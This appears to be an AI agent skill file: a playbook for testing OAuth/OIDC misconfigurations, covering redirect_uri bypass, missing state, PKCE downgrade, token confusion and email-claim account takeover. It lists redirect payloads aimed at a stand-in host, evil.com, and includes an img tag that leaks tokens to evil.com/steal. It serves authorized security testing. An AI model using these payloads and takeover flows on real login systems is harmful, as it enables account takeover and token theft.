---
name: oauth-oidc-misconfiguration
description: >-
  OAuth and OIDC misconfiguration testing playbook. Use when reviewing redirect URI
  handling, state and nonce validation, PKCE, token audience, callback binding,
  identity-provider trust flaws, and account takeover via OAuth flow manipulation.
---

# SKILL: OAuth/OIDC Misconfiguration — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: OAuth 2.0 and OpenID Connect misconfiguration covers redirect URI bypass, missing state parameter (CSRF), PKCE downgrade, token audience confusion, email-claim trust leading to account takeover, and implicit flow token leakage. Base models often test only the authorization code flow — this skill covers all grant types and OIDC-specific attack surfaces.

## QUICK START

### First-pass probes

| Situation | Check | Why |
|---|---|---|
| "Login with X" button | Examine redirect_uri parameter | Path traversal / open redirect bypass |
| OAuth callback visible | Check for `state` parameter | Missing state = CSRF |
| Token in URL fragment | Check URL after callback | Implicit flow leaks token |
| Multiple IdPs | Check account linking logic | Email claim trust = account takeover |
| PKCE flow | Check `code_challenge` presence | Missing PKCE = code interception |

### First-pass probe set

```text
# Redirect URI bypass:
redirect_uri=https://evil.com
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://target.com/callback.evil.com
redirect_uri=https://target.com/callback%23@evil.com

# State parameter:
# Remove state entirely → still accepted?
# Replay state from different session → accepted?

# PKCE:
# Remove code_challenge → still works?
```

---

## 1. CORE CONCEPT

### OAuth 2.0 Flow (Authorization Code)

```
User → SP: "Login with IdP"
SP → IdP: Redirect to /authorize?redirect_uri=CALLBACK
IdP → User: Login + consent
IdP → SP: Redirect to CALLBACK?code=AUTH_CODE
SP → IdP: POST /token (exchange code for access_token)
SP → User: Authenticated
```

### OIDC Extensions

OIDC adds `id_token` (JWT containing user identity claims) and standardized userinfo endpoint.

### Key Parameters

| Parameter | Purpose | Attack Surface |
|---|---|---|
| `redirect_uri` | Where IdP sends the auth code | Bypass validation |
| `state` | CSRF protection for OAuth flow | Missing/replayed |
| `nonce` | Replay protection for id_token | Missing/replayed |
| `code_challenge` | PKCE: binds code to verifier | Downgrade/remove |
| `scope` | Permission request | Escalation |
| `aud` / `iss` | Token audience and issuer | Confusion attacks |

---

## 2. REDIRECT URI BYPASS

### Path Traversal

```text
# Original: redirect_uri=https://target.com/callback
# Bypass attempts:
redirect_uri=https://target.com/callback/../evil
redirect_uri=https://target.com/callback/../../evil
redirect_uri=https://target.com/callback%2F..%2Fevil
redirect_uri=https://target.com/callback%23
redirect_uri=https://target.com/callback?redirect=https://evil.com
```

### Subdomain / Domain Confusion

```text
redirect_uri=https://evil.target.com/callback
redirect_uri=https://target.com.evil.com/callback
redirect_uri=https://target.com@evil.com/callback
redirect_uri=https://target.com%00@evil.com/callback
```

### Fragment and Query Manipulation

```text
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback?foo=bar&redirect=evil.com
redirect_uri=https://target.com/callback#evil.com
```

### HTTP vs HTTPS

```text
redirect_uri=http://target.com/callback    # Downgrade to HTTP
redirect_uri=https://127.0.0.1/callback    # Loopback
redirect_uri=https://localhost/callback     # Localhost
```

---

## 3. STATE PARAMETER ISSUES

### Missing State → CSRF

```text
# Normal: /authorize?...&state=RANDOM
# Vulnerable: /authorize?... (no state parameter)
# Attack: Craft link without state → victim clicks → their account linked to attacker's IdP
```

### Weak/Static State

```text
# State is predictable (timestamp, sequential, static):
state=12345
state=2024-01-01
state=static_value

# Replay state from another session → accepted?
```

---

## 4. PKCE VIOLATIONS

### Missing code_challenge

```text
# If PKCE is optional:
# Remove code_challenge entirely → server still issues code
# Attacker intercepts code (via open redirect/referrer) → exchanges without verifier
```

### Verifier Reuse

```text
# code_verifier should be unique per authorization request
# Reuse across sessions → verifier leakage enables code theft
```

### Downgrade Attack

```text
# If server supports both PKCE and non-PKCE flows:
# Remove code_challenge parameter → server falls back to non-PKCE
# Intercept authorization code via network/Referrer/log
```

---

## 5. TOKEN AUDIENCE AND ISSUER

### Audience Confusion

```text
# Token issued for app A but accepted by app B:
# aud claim in JWT should match the client_id
# If server accepts any aud → token confusion attack
```

### Issuer Spoofing

```text
# iss claim should match expected IdP
# If server doesn't validate iss → token from malicious IdP accepted
```

### Token Replay

```text
# Access token obtained from one endpoint → used against another:
# 1. Get token from /api/v1/auth
# 2. Use same token against /api/v2/admin
```

---

## 6. ACCOUNT BINDING FLAWS

### Email Claim Trust (Account Takeover)

```
# Attack flow:
1. Attacker registers on IdP with victim's email (attacker@victim-domain if no verification)
2. Attacker triggers "Login with IdP" on target
3. Target trusts email claim from IdP → links to existing victim account
4. Attacker now has access to victim's account
```

### Account Linking Without Verification

```
# Some apps allow "link another provider":
# 1. Victim logged in via password
# 2. Attacker links attacker's IdP to victim's account (no email verification)
# 3. Attacker logs in via IdP → takes over account
```

### Password After SSO

```
# Some apps set a default/random password during SSO registration:
# 1. Attacker registers via "Login with Google"
# 2. App creates account with email + random password
# 3. Attacker requests password reset → takes over account
```

---

## 7. IMPLICIT FLOW TOKEN LEAKAGE

### Token in URL Fragment

```text
# Implicit flow returns token in URL fragment:
https://target.com/callback#access_token=SECRET123&token_type=Bearer

# Leaked via:
- Referer header when loading external resources
- Browser history
- Server access logs (if URL is logged)
- Shared links (user copies URL with token)
```

### Token via Referrer

```html
<!-- Callback page loads external resource -->
<img src="https://evil.com/steal">
<!-- Referrer header contains: https://target.com/callback#access_token=... -->
<!-- Note: fragment is NOT sent in Referer by default, but some implementations expose it -->
```

---

## 8. SCOPE ESCALATION AND CONSENT BYPASS

### Scope Escalation

```text
# Initial authorization: scope=openid profile
# Modified request: scope=openid profile admin api
# If server doesn't validate scope escalation → attacker gets admin access
```

### Consent Bypass

```text
# Some IdPs allow pre-approved scopes:
# If consent is auto-approved for all scopes → no user interaction needed
# Combine with redirect_uri bypass for silent account takeover
```

---

## 9. NONCE AND REPLAY

### Missing Nonce

```text
# OIDC id_token should include nonce to prevent replay:
# If nonce is missing:
# 1. Capture valid id_token
# 2. Replay in different session
# 3. Server accepts → authentication bypass
```

### Nonce Reuse

```text
# If nonce is static or reused across sessions:
# Capture id_token with nonce=X
# Wait for new session using same nonce=X
# Replay captured token
```

---

## DECISION TREE

```
Found OAuth/OIDC flow ("Login with X")?
├── Check redirect_uri validation
│   ├── Path traversal? → bypass callback
│   ├── Subdomain confusion? → evil.target.com
│   ├── Fragment/query manipulation? → redirect leakage
│   └── HTTP downgrade? → network interception
│
├── Check state parameter
│   ├── Missing? → CSRF (link victim's account to attacker IdP)
│   └── Static/predictable? → CSRF with crafted state
│
├── Check PKCE
│   ├── Missing code_challenge? → code interception possible
│   └── Downgrade allowed? → remove PKCE, intercept code
│
├── Check token handling
│   ├── Implicit flow? → token in URL → Referer/history leak
│   ├── Audience not validated? → token confusion
│   └── Nonce missing? → id_token replay
│
├── Check account binding
│   ├── Email claim trusted without verification? → account takeover
│   └── Password set after SSO? → reset-based takeover
│
└── Check scope
    ├── Scope escalation possible? → admin access
    └── Auto-consent? → silent authorization
```

---

## TESTING CHECKLIST

- [ ] Identify OAuth/OIDC provider and grant type (authorization code, implicit, hybrid)
- [ ] Test redirect_uri bypass (path traversal, subdomain, fragment, HTTP downgrade)
- [ ] Verify state parameter presence and randomness
- [ ] Test CSRF by removing/replaying state parameter
- [ ] Check PKCE implementation (code_challenge present, verified on exchange)
- [ ] Test token audience validation (aud claim in JWT)
- [ ] Check nonce in OIDC id_token
- [ ] Test email claim trust (register with victim email on IdP)
- [ ] Check implicit flow token leakage (URL fragment, Referrer)
- [ ] Test scope escalation (request admin/api scopes)
- [ ] Check auto-consent for dangerous scopes
- [ ] Verify token not replayable across different client_ids

---

## TARGET TOOL ADAPTATION

Use visible `http-framework-test` for controlled flow replay and `jwt-analyzer` for token inspection. Browser observation is optional and only applies when a browser tool is actually visible. Do not invent repeater or browser-agent MCP calls.

---

## RELATED ROUTING

- [CORS Misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) — when CORS allows token theft cross-origin
- [JWT/OAuth Token Attacks](../jwt-oauth-token-attacks/SKILL.md) — when token signing or claims are weak
- [CSRF Testing](../csrf-cross-site-request-forgery/SKILL.md) — when OAuth state parameter is missing
- [SAML SSO Assertion Attacks](../saml-sso-assertion-attacks/SKILL.md) — when SAML-based SSO is in use
